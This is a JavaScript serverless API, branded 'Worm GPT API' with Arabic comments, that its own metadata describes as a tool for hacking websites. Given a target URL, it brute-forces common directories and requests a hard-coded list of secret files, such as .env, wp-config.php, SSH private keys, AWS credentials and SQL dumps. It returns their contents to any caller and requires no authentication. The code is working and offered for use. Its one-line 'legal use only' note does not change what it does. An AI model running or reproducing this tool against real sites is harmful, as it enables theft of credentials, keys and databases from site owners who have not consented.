// Worm GPT API - للبوتات (تيليجرام، ديسكورد، واتساب، الخ)
// جلب جميع ملفات المواقع بدون قيود

const https = require('https');
const http = require('http');

// الملفات الحساسة المستهدفة
const SENSITIVE_FILES = [
    '.env', 'config.php', 'wp-config.php', 'database.php', 'db.php',
    '.git/config', '.gitignore', '.htaccess', 'robots.txt', 'backup.sql',
    'dump.sql', 'admin.sql', 'password.txt', 'passwords.txt', 'config.json',
    'settings.py', 'app.config', 'web.config', 'credentials.txt',
    '.aws/credentials', 'id_rsa', '.ssh/id_rsa', 'secret.key', 'api_keys.txt',
    'wp-config.php', 'config.inc.php', 'db_config.php', 'connection.php',
    'adminer.php', 'phpinfo.php', 'info.php', 'test.php', 'debug.php'
];

// امتدادات الملفات للجلب
const EXTENSIONS = [
    '.html', '.htm', '.php', '.asp', '.aspx', '.jsp', '.txt', '.pdf',
    '.doc', '.docx', '.xls', '.xlsx', '.zip', '.tar', '.gz', '.rar',
    '.sql', '.db', '.log', '.bak', '.backup', '.json', '.xml', '.conf',
    '.css', '.js', '.csv', '.md', '.yml', '.yaml', '.ini', '.htaccess',
    '.git', '.env', '.sh', '.bash', '.py', '.rb', '.java', '.c', '.cpp',
    '.pem', '.key', '.crt', '.p12', '.pfx'
];

// قائمة المجلدات الشائعة للفحص
const COMMON_DIRS = [
    'admin', 'login', 'backup', 'uploads', 'files', 'download', 'images',
    'css', 'js', 'assets', 'static', 'media', 'wp-admin', 'wp-content',
    'wp-includes', 'administrator', 'cpanel', 'webmail', 'phpmyadmin',
    'mysql', 'db', 'database', 'config', 'conf', 'etc', 'tmp', 'temp',
    'logs', 'log', 'secret', 'private', 'hidden', 'secure', 'api', 'v1', 'v2',
    'old', 'new', 'test', 'dev', 'stage', 'staging'
];

let visitedUrls = new Set();
let foundFiles = [];
let pagesCrawled = 0;

function fetchUrl(url, timeout = 10000) {
    return new Promise((resolve, reject) => {
        const protocol = url.startsWith('https') ? https : http;
        const request = protocol.get(url, { timeout }, (response) => {
            if (response.statusCode === 200) {
                let data = '';
                response.on('data', chunk => data += chunk);
                response.on('end', () => resolve({ status: 200, data, headers: response.headers }));
            } else if (response.statusCode === 301 || response.statusCode === 302) {
                const redirectUrl = response.headers.location;
                if (redirectUrl) {
                    fetchUrl(redirectUrl).then(resolve).catch(reject);
                } else {
                    resolve({ status: response.statusCode, data: null });
                }
            } else {
                resolve({ status: response.statusCode, data: null });
            }
        });
        request.on('error', () => resolve({ status: 0, data: null }));
        request.end();
    });
}

function extractLinks(html, baseUrl) {
    const links = new Set();
    const urlRegex = /(href|src)=["']([^"']+)["']/gi;
    let match;
    while ((match = urlRegex.exec(html)) !== null) {
        let link = match[2];
        if (link && !link.startsWith('#') && !link.startsWith('javascript:') && !link.startsWith('mailto:') && !link.startsWith('tel:')) {
            try {
                const fullUrl = new URL(link, baseUrl).href;
                const baseDomain = baseUrl.split('/').slice(0, 3).join('/');
                if (fullUrl.startsWith(baseDomain)) {
                    links.add(fullUrl);
                }
            } catch (e) {}
        }
    }
    return links;
}

function isSensitiveFile(path) {
    const lowerPath = path.toLowerCase();
    for (const sensitive of SENSITIVE_FILES) {
        if (lowerPath.includes(sensitive.toLowerCase())) {
            return true;
        }
    }
    return false;
}

function shouldDownloadFile(url) {
    const lowerUrl = url.toLowerCase();
    for (const ext of EXTENSIONS) {
        if (lowerUrl.endsWith(ext)) {
            return true;
        }
    }
    return false;
}

async function bruteDirectories(baseUrl) {
    const found = [];
    for (const dir of COMMON_DIRS) {
        const testUrl = `${baseUrl}/${dir}`;
        try {
            const response = await fetchUrl(testUrl, 5000);
            if (response.status === 200) {
                found.push(testUrl);
                // محاولة جلب الملفات داخل المجلد
                if (shouldDownloadFile(testUrl) || isSensitiveFile(testUrl)) {
                    let contentPreview = '';
                    let size = 0;
                    if (response.data) {
                        size = response.data.length;
                        contentPreview = size < 10000 ? response.data : response.data.substring(0, 5000);
                    }
                    foundFiles.push({
                        url: testUrl,
                        type: 'file',
                        sensitive: isSensitiveFile(testUrl),
                        size: size,
                        preview: contentPreview || 'ملف تم اكتشافه',
                        extension: testUrl.split('.').pop().toLowerCase()
                    });
                }
            }
        } catch (e) {}
    }
    return found;
}

async function crawl(url, baseUrl, depth = 0, maxDepth = 30) {
    if (depth > maxDepth) return;
    if (visitedUrls.has(url)) return;
    visitedUrls.add(url);
    pagesCrawled++;

    try {
        const response = await fetchUrl(url);
        
        if (response.status === 200 && response.data) {
            const isSensitive = isSensitiveFile(url);
            
            if (shouldDownloadFile(url) || isSensitive) {
                let size = response.data.length;
                let contentPreview = '';
                
                if (size < 10000) {
                    contentPreview = response.data;
                } else {
                    contentPreview = response.data.substring(0, 5000) + '\n\n... [ملف كبير، تم اقتطاعه] ...';
                }
                
                // تجنب التكرار
                const existing = foundFiles.find(f => f.url === url);
                if (!existing) {
                    foundFiles.push({
                        url: url,
                        type: 'file',
                        sensitive: isSensitive,
                        size: size,
                        preview: contentPreview,
                        extension: url.split('.').pop().toLowerCase()
                    });
                }
            }
            
            const links = extractLinks(response.data, baseUrl);
            const baseDomain = baseUrl.split('/').slice(0, 3).join('/');
            
            for (const link of links) {
                if (!visitedUrls.has(link) && link.startsWith(baseDomain)) {
                    await crawl(link, baseUrl, depth + 1, maxDepth);
                }
            }
        } else if (shouldDownloadFile(url)) {
            const existing = foundFiles.find(f => f.url === url);
            if (!existing) {
                foundFiles.push({
                    url: url,
                    type: 'file',
                    sensitive: isSensitiveFile(url),
                    size: 0,
                    preview: '⚠️ تعذر الوصول إلى هذا الملف (قد يكون محميًا أو لا يوجد)',
                    extension: url.split('.').pop().toLowerCase()
                });
            }
        }
    } catch (error) {
        // تجاهل الأخطاء
    }
}

async function scanWebsite(targetUrl, options = {}) {
    // إعادة تعيين المتغيرات
    visitedUrls.clear();
    foundFiles = [];
    pagesCrawled = 0;
    
    const maxDepth = options.maxDepth || 30;
    const bruteDirs = options.bruteDirs !== false;
    const maxFiles = options.maxFiles || 500;
    
    // تنسيق الرابط
    let url = targetUrl;
    if (!url.startsWith('http')) {
        url = 'https://' + url;
    }
    
    const baseDomain = url.split('/').slice(0, 3).join('/');
    
    // 1. فحص المجلدات الشائعة
    if (bruteDirs) {
        await bruteDirectories(baseDomain);
    }
    
    // 2. البحث عن ملفات حساسة مباشرة
    for (const sensitive of SENSITIVE_FILES) {
        const testUrl = `${baseDomain}/${sensitive}`;
        if (!visitedUrls.has(testUrl)) {
            const response = await fetchUrl(testUrl, 5000);
            if (response.status === 200) {
                const existing = foundFiles.find(f => f.url === testUrl);
                if (!existing) {
                    foundFiles.push({
                        url: testUrl,
                        type: 'file',
                        sensitive: true,
                        size: response.data?.length || 0,
                        preview: response.data?.substring(0, 2000) || '',
                        extension: sensitive.split('.').pop()
                    });
                }
            }
        }
    }
    
    // 3. الزحف الرئيسي
    await crawl(url, url, 0, maxDepth);
    
    // 4. إزالة التكرارات
    const uniqueFiles = [];
    const seenUrls = new Set();
    for (const file of foundFiles) {
        if (!seenUrls.has(file.url)) {
            seenUrls.add(file.url);
            uniqueFiles.push(file);
        }
    }
    foundFiles = uniqueFiles;
    
    // 5. ترتيب النتائج
    const sensitiveFiles = foundFiles.filter(f => f.sensitive);
    const regularFiles = foundFiles.filter(f => !f.sensitive);
    
    return {
        success: true,
        target: url,
        timestamp: new Date().toISOString(),
        statistics: {
            totalFiles: foundFiles.length,
            sensitiveFiles: sensitiveFiles.length,
            regularFiles: regularFiles.length,
            pagesCrawled: pagesCrawled,
            uniqueUrls: visitedUrls.size
        },
        sensitiveFiles: sensitiveFiles.slice(0, 50),
        allFiles: foundFiles.slice(0, maxFiles),
        summary: `✅ تم العثور على ${foundFiles.length} ملف\n⚠️ ${sensitiveFiles.length} ملف حساس\n🔍 تم استكشاف ${pagesCrawled} صفحة`
    };
}

export default async function handler(req, res) {
    // إعدادات CORS للبوتات
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Content-Type', 'application/json');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // GET: معلومات API
    if (req.method === 'GET') {
        return res.status(200).json({
            name: 'Worm GPT API',
            version: '3.0',
            description: 'API لاختراق المواقع وجلب جميع الملفات',
            author: 'WORM GPT',
            status: 'online',
            endpoints: {
                'POST /': {
                    description: 'تنفيذ هجوم جلب الملفات',
                    body: {
                        url: { type: 'string', required: true, description: 'الموقع المستهدف' },
                        maxDepth: { type: 'number', required: false, default: 30, description: 'عمق الزحف (10-100)' },
                        bruteDirs: { type: 'boolean', required: false, default: true, description: 'فحص المجلدات الشائعة' },
                        maxFiles: { type: 'number', required: false, default: 500, description: 'الحد الأقصى للملفات' }
                    },
                    example: {
                        url: 'http://testphp.vulnweb.com',
                        maxDepth: 20
                    }
                }
            },
            auth: 'بدون مصادقة - مفتوح للجميع',
            note: 'للاستخدام القانوني فقط على المواقع التي تملكها'
        });
    }

    // POST: تنفيذ الهجوم
    if (req.method === 'POST') {
        const { url, maxDepth, bruteDirs, maxFiles } = req.body;
        
        if (!url) {
            return res.status(400).json({
                success: false,
                error: 'الرجاء إدخال رابط الموقع',
                usage: { url: 'https://example.com' }
            });
        }
        
        try {
            const result = await scanWebsite(url, {
                maxDepth: maxDepth || 30,
                bruteDirs: bruteDirs !== false,
                maxFiles: maxFiles || 500
            });
            
            return res.status(200).json(result);
        } catch (error) {
            return res.status(500).json({
                success: false,
                error: error.message
            });
        }
    }
    
    return res.status(405).json({ error: 'Method not allowed' });
                       }
